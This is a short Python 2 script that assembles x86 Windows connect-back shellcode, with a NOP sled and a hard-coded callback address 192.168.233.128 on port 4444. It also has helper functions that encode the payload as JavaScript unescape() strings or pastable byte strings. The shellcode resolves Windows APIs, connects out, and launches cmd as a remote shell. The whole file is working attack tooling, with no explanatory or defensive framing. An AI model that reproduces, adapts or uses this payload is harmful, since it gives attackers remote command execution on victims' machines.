def Shellcode():
    import socket, struct
    NOPS = "\x90" * 100
    packedIP = socket.inet_aton("192.168.233.128")
    packedPort = struct.pack(">H", 4444)
    # Connect back TCP Shellcode x86
    # by n3k :)
    # CreateProcess + ExitProcess
    #  - Tested on Win7, Win2008 R2
    buff = ""
    buff += "\xEB\x78\x56\x33\xC0\x64\x8B\x40\x30\x3E\x8B\x40\x0C\x3E\x8B\x70\x0C"
    buff += "\xAD\x33\xDB\x3E\x8B\x04\x18\x3E\x8B\x40\x18\x5E\xC3\x60\x36\x8B\x6C"
    buff += "\x24\x24\x36\x8B\x7D\x3C\x36\x8B\x7C\x3D\x78\x03\xFD\x3E\x8B\x4F\x18"
    buff += "\x3E\x8B\x5F\x20\x03\xDD\x85\xC9\x74\x3B\x49\x3E\x8B\x34\x8B\x03\xF5"
    buff += "\x33\xD2\x33\xC0\xFC\xAC\x84\xC0\x74\x07\xC1\xCA\x0D\x03\xD0\xEB\xF4"
    buff += "\x36\x3B\x54\x24\x28\x75\xDD\x3E\x8B\x57\x24\x03\xD5\x66\x3E\x8B\x0C"
    buff += "\x4A\x3E\x8B\x57\x1C\x03\xD5\x3E\x8B\x04\x8A\x03\xC5\x36\x89\x44\x24"
    buff += "\x1C\x61\xC3\xEB\x02\xEB\x1D\xE8\xF9\xFF\xFF\xFF\x8E\x4E\x0E\xEC\x7E"
    buff += "\xD8\xE2\x73\x72\xFE\xB3\x16\xD9\x09\xF5\xAD\xEC\xF9\xAA\x60\xCB\xED"
    buff += "\xFC\x3B\x5E\x33\xC0\xB0\x30\x2B\xE0\x8B\xEC\xE8\x59\xFF\xFF\xFF\x8B"
    buff += "\xD8\x33\xC9\xB1\x03\x8B\xD5\x85\xC9\x74\x1E\xAD\x50\x53\xE8\x61\xFF"
    buff += "\xFF\xFF\x51\xC1\xE1\x02\x3E\x8D\x1C\x0A\x3E\x89\x03\x59\x5B\x33\xC0"
    buff += "\xB0\x04\x03\xE0\x49\xEB\xDE\x33\xC0\x66\xB8\x6C\x6C\x50\x68\x33\x32"
    buff += "\x2E\x64\x68\x77\x73\x32\x5F\x54\x36\xFF\x55\x0C\x8B\xD8\x36\x8D\x55"
    buff += "\x0C\x33\xC9\xB1\x03\x85\xC9\x74\x1E\xAD\x50\x53\xE8\x1F\xFF\xFF\xFF"
    buff += "\x51\xC1\xE1\x02\x3E\x8D\x1C\x0A\x3E\x89\x03\x59\x5B\x33\xC0\xB0\x04"
    buff += "\x03\xE0\x49\xEB\xDE\xB8\x01\x63\x6D\x64\xC1\xF8\x08\x50\x36\x89\x65"
    buff += "\x2C\x33\xC0\xB4\x02\x2B\xE0\x54\xC1\xE8\x08\x50\x36\xFF\x55\x10\x33"
    buff += "\xC0\x50\x50\x50\x50\x40\x50\x40\x50\x36\xFF\x55\x18\x8B\xF0\x68"
    buff += packedIP
    buff += "\xBB\x02\x01"
    buff += packedPort
    buff += "\xFE\xCF\x53\x8B\xDC\x33\xC0\xB0\x10\x50\x53\x56"
    buff += "\x36\xFF\x55\x14\x33\xC9\xB1\x54\x2B\xE1\x8B\xFC\x57\x33\xC0\xF3\xAA"
    buff += "\x5F\x3E\xC6\x07\x44\x3E\xC6\x47\x2D\x01\x57\x8B\xC6\x3E\x8D\x7F\x38"
    buff += "\xAB\xAB\xAB\x5F\x33\xC0\x3E\x8D\x77\x44\x56\x57\x50\x50\xB0\x80\xC1"
    buff += "\xE0\x14\x50\x33\xC0\xB0\x01\x50\x48\x50\x50\x36\xFF\x75\x2C\x50\x36"
    buff += "\xFF\x55\x04\x36\xFF\x55\x08"
        
    shellcode = NOPS + buff
    print "Shellcode length: ", len(shellcode)
    
    return shellcode

def encodeUnescape(shellcode):
    format_string = []
    for i in xrange(0,len(shellcode),2):
        format_string.append("%u{:02x}{:02x}".format(ord(shellcode[i+1]),ord(shellcode[i])))
    print "unescape(\"%s\");" % "".join([_ for _ in format_string])


def pastableForm(shellcode):
    format_string = []
    for i in shellcode:
        format_string.append("\\x{:02x}".format(ord(i)))
    print "%s" % "".join([_ for _ in format_string])

def FourByteAlignment(shellcode):
    while len(shellcode)%4 != 0:
        shellcode = "\x90" + shellcode
    return shellcode

encodeUnescape(FourByteAlignment(Shellcode()))